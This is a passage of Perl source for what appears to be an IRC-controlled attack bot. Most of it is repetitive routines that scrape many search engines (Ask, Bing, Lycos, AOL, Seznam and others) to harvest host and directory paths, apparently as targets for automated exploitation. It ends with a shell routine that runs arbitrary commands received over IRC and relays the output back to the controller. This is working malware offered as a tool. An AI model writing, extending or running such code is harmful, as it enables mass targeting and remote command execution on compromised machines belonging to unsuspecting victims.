                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://ru.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askRU\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://nl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askNL\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askPL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://pl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askPL\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askAT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://at.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askAT\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askSE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://se.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askSE\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://dk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askDK\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askNO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://no.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askNO\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://au.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askAU\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://br.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askBR\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub askMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://mx.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askMX\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub askJP() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=100; $i+=1) {
        my $search = ("http://jp.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /askJP\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub onet() {
	my @list;
	my $key = $_[0];
	my $b   = 0;
	for ($b=1; $b<=400; $b+=10) {
		my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));
		my $res = &search_engine_query($search);
		while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {
			my $link = $1;
			if ($link !~ /onet|webcache|query/){
				my @grep = &links($link);
                push(@list,@grep);
			}
		}
	}
	return @list;
}

sub clusty() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=200; $b+=10) {
        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");
        my $res = &search_engine_query($search);
		if ($res !~ /next/) {$b=100;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($1 !~ /yippy\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=400; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
			my $link = $1;
            if ($link !~ /google/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingDE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=de&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingDE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingUK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=uk&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingUK/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCA() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ca&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCA/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingBR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=br&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingBR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingFR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=fr&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingFR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingES() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=es&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingES/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingIT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=it&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingIT/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingBE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=be&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingBE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nl&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNL/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingPT() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=pt&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingPT/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNO() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=no&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNO/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingDK() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=dk&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingDK/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingSE() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=se&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingSE/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingCH() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ch&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCH/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nz&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingNZ/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingRU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ru&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingRU/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingJP() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=jp&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingJP/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCN() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cn&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCN/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingKR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=kr&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingKR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(4);
sub bingMX() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=mx&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingMX/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAR() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ar&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAR/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingCL() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cl&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingCL/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bingAU() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=1000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=au&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAU/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub sapo(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".uri_escape($key)."&st=local");
        my $res = &search_engine_query($search);
		if ($res !~ m/Next/i) {$b=50;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($1 !~ /\.sapo\.pt/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub lycos() { 
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.lycos.com/web?q=".uri_escape($key)."&pn=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/title=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link !~ /lycos/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub uol() {
	my @list;
	my $key = $_[0];
    for ($b=0; $b<=1000; $b+=10) {
        my $search = ("http://busca.uol.com.br/web/?ref=homeuol&q=".uri_escape($key)."&start=".$b);
        my $res = &search_engine_query($search);
		if ($res =~ m/retornou nenhum resultado/i) {$b=500;}
        while ($res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {
            my $link = $1;
            if ($link !~ /uol\.com\.br|\/web/i){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub seznam() {
	my @list;
	my $key = $_[0];
    for ($b=1; $b<=300; $b+=20) {
        my $search = ("http://search.seznam.cz/?q=".uri_escape($key)."&count=20&from=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {
            my $link = $1;
            if ($link !~ /seznam\.cz|chytrevyhledavani\.cz|smobil\.cz|sklik\.cz/i){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub hotbot() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/search/web?pn=".$b."&q=".uri_escape($key));
        my $res = &search_engine_query($search);
		if ($res =~ m/had no web result/i) {$b=50;}
        while ($res =~ m/href=\"http:\/\/(.+?)\" title=/g) {
            my $link = $1;
            if ($link !~ /hotbot\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub aol() {
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=300; $b+=10) {
		my $search = ("http://search.aol.com/aol/search?q=".uri_escape($key)."&page=".$b);
		my $res = &search_engine_query($search);
		while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
			my $link = $1;
			if ($link !~ /aol\.com/){
				my @grep = &links($link);
				push(@list,@grep);
			}
		}
	}
	return @list;
}

sub biglobe {
  my $key = $_[0];
  my @list;
  for ($b=1; $b<=500; $b+=10) {
    $num += $num;
    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=".$num."&q=".uri_escape($key)."&lr=all";
    my $res = &search_engine_query($search);
    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {
	    my $link = $1;
        if ($link !~ /biglobe/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

#########################################

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$host,$hdir);
    return @list;
}

sub search_engine_query() {
	my $url = $_[0];
	$url =~ s/http:\/\///;
	my $host = $url;
	my $query = $url;
	my $page  = "";
	$host =~ s/href=\"?http:\/\///;
	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
	$query =~ s/$host//;
	if ($query eq "") { $query = "/"; }
		eval {
			my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
			my $sget = "GET $query HTTP/1.0\r\n";
			$sget .= "Host: $host\r\n";
			$sget .= "Accept: */*\r\n";
			$sget .= "User-Agent: $uagent\r\n";
			$sget .= "Connetion: Close\r\n\r\n";
			print $sock $sget;
			my @pages = <$sock>;
			$page = "@pages";
			close($sock);
		};
	return $page;
}

#########################################

sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 3; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}
sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
} 